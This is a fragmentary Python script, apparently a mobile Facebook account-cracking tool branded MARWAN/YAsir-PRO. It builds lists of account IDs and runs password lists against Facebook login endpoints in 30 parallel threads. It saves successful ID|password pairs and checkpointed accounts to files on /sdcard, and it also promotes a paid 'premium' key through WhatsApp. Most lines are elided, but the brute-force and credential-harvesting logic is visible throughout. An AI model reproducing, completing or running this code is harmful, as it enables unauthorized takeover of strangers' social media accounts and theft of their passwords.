...
----------------------------------------------
 ...
 Github    : Ykimg
 Facebook  : Marwan jaani
 Tool Name : YAsir-PRO
 Type type : Free
 Version   : 1.9.9
----------------------------------------------
 MARWAN Pro version 1.9.9
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://chat.whatsapp.com/GazsfUBJWwGCFcgnavctdT');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/MARWAN.TECH1');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi YASIR_X_MARWQN Sir, I Need To Buy Your Paid MARWAN  PRO Tools Version 1.9.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ARIYAN .py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ARIYAN :     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                MARWAN .submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MARWAN -XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ARIYAN =session.cookies.get_dict().keys()
                        if "c_user" in ARIYAN :
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [MARWAN -OK] %s | %s'%(ids,pas))
                                open('/sdcard/MARWAN -OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ARIYAN :
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ARIYAN -CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MARWAN -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MARWAN -OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MARWAN -OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [MARWAN -CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MARWAN -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ARIYAN -XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MARWAN -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MARWAN -OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MARWAN -OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MARWAN -OK] '+uid+' | '+pas+'\033[1;97m')
